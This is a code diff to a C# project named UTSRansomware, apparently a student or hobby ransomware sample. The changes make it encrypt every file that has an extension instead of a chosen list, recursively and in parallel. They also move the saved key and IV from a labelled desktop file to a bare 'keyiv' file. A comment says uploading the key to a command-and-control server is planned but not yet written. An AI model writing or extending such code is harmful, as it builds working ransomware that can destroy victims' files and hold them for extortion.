@@ -56,7 +56,7 @@ namespace UTSRansomware
              * After all encryption completed save the key and iv to text file
              * This is where the upload to a C2 should happen but I haven't implemented that yet
              */
-            SaveKeyAndIvToDesktop();
+            SaveKeyAndIv();
         }
 
         // Encrypts all files in a directory, recursviely calls istelf to encrypt files in sub directories
@@ -75,7 +75,7 @@ namespace UTSRansomware
             Parallel.ForEach(filePaths, (filePath) =>
             {
                 string fileExtension = Path.GetExtension(filePath);
-                if (Utils.fileExtensions.Contains(fileExtension))
+                if (!string.IsNullOrEmpty(fileExtension))
                 {
                     try
                     {
@@ -153,17 +153,16 @@ namespace UTSRansomware
         }
 
         // Writes key and iv to desktop
-        private void SaveKeyAndIvToDesktop()
+        private void SaveKeyAndIv()
         {
-            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            string fileName = Path.Combine(desktopPath, "key_iv.txt");
+            string fileName = "keyiv";
 
             // Convert key and IV to Base64 strings
             string keyAsString = Convert.ToBase64String(this.key);
             string ivAsString = Convert.ToBase64String(this.iv);
 
             // Combine them into a single string and write to file
-            string combined = $"Key: {keyAsString}\nIV: {ivAsString}";
+            string combined = $"{keyAsString}\n{ivAsString}";
 
             File.WriteAllText(fileName, combined);
         }
